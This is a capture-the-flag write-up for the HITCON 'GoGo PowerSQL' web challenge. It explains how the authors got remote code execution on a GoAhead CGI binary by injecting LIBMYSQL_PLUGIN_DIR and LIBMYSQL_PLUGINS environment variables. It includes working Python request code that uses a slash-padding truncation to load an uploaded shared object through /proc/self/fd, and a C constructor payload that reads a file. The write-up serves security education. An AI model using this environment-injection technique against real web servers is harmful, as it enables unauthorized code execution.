---
title: HITCON Qualification - GoGo PowerSQL
authors: Devon Maloney (plailect), Glenn Smith (glenns)
date: 2019-10-20
categories: web
---

This was a CGI binary written in C which used `libmysqlclient` to query results given by the user, powered by the [GoAhead](https://github.com/embedthis/goahead/) embedded web server.

The clear first point of attack was to try SQL injection and we found quite quickly that the code
filtered all characters in the input with `isalpha`. We also noticed that the buffer they were `snprintf`ing
the query into was of fixed size, 0x3ff. While we could not overflow this, we could truncate the closing quote leading to a MySQL error being printed to the page. The latter of these did not end up being useful in any way, but we spent some time looking into it so it is worth mentioning.

![bug](/assets/hc_powersql_bug.png)

Although we did not initially realize it, this challenge also made reference to a past vulnerability in GoAhead where query parameters were being passed to CGI scripts as environment variables. GoAhead had patched this vulnerability by prefixing all variables with `CLI_` (to prevent people from overwriting `LD_PRELOAD` etc) but the challenge explicitly unpatched this bug. That was an immediately obvious point of attack for us, and we set out to find an environment variable we could control.

```bash
RUN sed -i 's/CGI/\x0\x0\x0/g' /usr/local/bin/goahead
```

We quickly found that, although the challenge re-enabled arbitrary environment variable overwriting, it did not patch out the blacklist filtering which had been added as a hotfix patch. This filtering disallowed us the use of variables such as `PATH`, `IFS`, and anything that started with `LD_`, blocking access to all of the easy paths to RCE.

The first environment variable we attempted to exploit was `LANG`. Seeing how the challenge stripped characters from the input using `isalpha` and knowing that `isalpha` depended on the current locale, we searched for a locale that considered single quotes to be an alpha character. After spending a few hours toying around with the nightmare that is C and locale support, we discovered that, not only did the Dockerfile not install any languages other than POSIX and C, but that no locale we could find considered quotes to be an alpha character. Indeed, none of the locales we found had any different results for `isalpha` within the ASCII range (and there were no locales in the provided Docker container other than the standard `POSIX`, `C`, and `C.utf-8` locales anyway). As it turns out, locale support in C is, in general, extremely messy and configuration-specific.

![cppref1](/assets/hc_powersql_cppref1.jpg)

![cppref2](/assets/hc_powersql_cppref2.jpg)

After that waste of nearly a day, we started searching for a more exploitable environment variable. After consulting the (very poor) `libmysqlclient` documentation, we found that MySQL server (and client!) both load optional plugins from the a directory specified in the `LIBMYSQL_PLUGIN_DIR` environment variable, using names of plugins specified in the `LIBMYSQL_PLUGINS` environment variable, and these plugins are simply shared object libraries that get passed into `dlopen`. If we were able to load an arbitrary file with this, we could get code execution on the box and win. We had no way to drop files on the box, but we also knew from prior experience that CGI-bin implementations typically pass HTTP request bodies with `stdin`, so we set to crafting a request that would load a shared object that we controlled by loading from the file `/proc/self/fd/0`:

```python
import requests
requests.post("http://13.231.38.172/cgi-bin/query?name=a&LIBMYSQL_PLUGIN_DIR=" + "/proc/self/fd&LIBMYSQL_PLUGINS=0",data=open("testplugin.so","rb")).text
```

Unfortunately, we realized while testing on our local machines that this would not work as is. `libmysqlclient`, in its attempts to be helpful to the user, appends an extension to the plugin name before calling `dlopen` (`.so` in the case of Linux), resulting in it trying to load from `/proc/self/fd/0.so` which is not a valid file descriptor.

```c
/* From mysql/sql-common/client_plugin.c */

/* see <mysql/client_plugin.h> for a full description */
struct st_mysql_client_plugin *
mysql_load_plugin_v(MYSQL *mysql, const char *name, int type,
                    int argc, va_list args)
{
  char dlpath[FN_REFLEN+1];

  /* ... */

  /* Compile dll path */
  strxnmov(dlpath, sizeof(dlpath) - 1,
           mysql->options.extension && mysql->options.extension->plugin_dir ?
           mysql->options.extension->plugin_dir : PLUGINDIR, "/",
           name, SO_EXT, NullS);

  DBUG_PRINT ("info", ("dlopeninig %s", dlpath));
  /* Open new dll handle */
  if (!(dlhandle= dlopen(dlpath, RTLD_NOW)))
  {
    goto err;
  }

  /* ... */

}

```

Fortunately, we also realized that `libmysqlclient` uses a fixed size buffer to append this extension. If we sent enough characters in the plugin directory, we could overflow the extension and it would be cut off for us. 498 slashes later, we were successfully injecting arbitrary plugins into `libmysqlclient`:

```python
import requests
requests.post("http://13.231.38.172/cgi-bin/query?name=a&LIBMYSQL_PLUGIN_DIR=" + "/"*498 + "proc/self/fd&LIBMYSQL_PLUGINS=0",data=open("testplugin.so","rb")).text
```

Now we just needed a way to make `libmysqlclient` call our code so that we could read the flag. This was fairly trivially accomplished with a quick `__attribute__((constructor))`:

```c
#include <stdio.h>
/* gcc -shared -fPIC -o testplugin.so ./testplugin.c */
__attribute__((constructor))
void readflag() {
    FILE *f = fopen("/FLAG", "r");
    char buf[0x100];
    fread(buf, 1, 0x100, f);
    printf("%s\n", buf);
    fclose(f);
}
```

By combining this plugin with our library injection, we were able to achieve remote code execution and read the flag.

Interestingly, we learned after the CTF ended that this was [not the intended solution to this challenge](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#gogo-powersql):

```
1. Buffer Overflow the DB_HOST in BSS
2. Due to the patch, we can pollute environment variable which are not in the Blacklist.
3. Hijack MySQL connection by ENV such as LOCALDOMAIN or HOSTALIAES
4. Read /FLAG by LOAD DATA LOCAL INFILE.
```

The attack we have presented is more powerful than the intended solution as it allows for full RCE on the webserver rather than just control over the MySQL database and arbitrary file read.
